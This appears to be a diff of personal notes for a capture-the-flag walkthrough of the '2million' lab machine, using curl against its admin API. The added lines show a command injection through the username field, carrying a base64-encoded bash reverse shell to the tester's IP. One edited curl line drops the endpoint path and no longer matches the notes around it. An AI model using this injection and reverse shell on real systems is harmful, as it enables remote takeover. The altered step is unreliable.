@@ -119,7 +119,7 @@ curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -sv http://2million.htb/api
 - The API call to /api/v1 shows us the instructions for generating an invite code for a regular user, registering a new user and determining if the user is admin
 - Make a curl request to /api/v1/admin/settings/update, but note the method change. PUT will be used instead of the POST like we've been using
 ```bash
-curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb/api/v1/admin/settings/update | jq
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb | jq
 ```
 
 - We get a 200 OK message, the page is accessible to us! However, look at the message we received at the end. The "Invalid content type", it's expecting a JSON type
@@ -185,4 +185,12 @@ curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.ht
 ![[Pasted image 20230903234247.png]]
 
 - Using the find command, we've found the user.txt flag, however, when I tried cat'ing the file, nothing worked. 
-- Initiate your netcat listener
+- Initiate your netcat listener and execute your reverse shell
+
+```
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41Lzk5OTkgMD4mMQo= | base64 -d | bash ;"}'
+```
+
+- And we have a shell!
+![[Pasted image 20230904000916.png]]
+
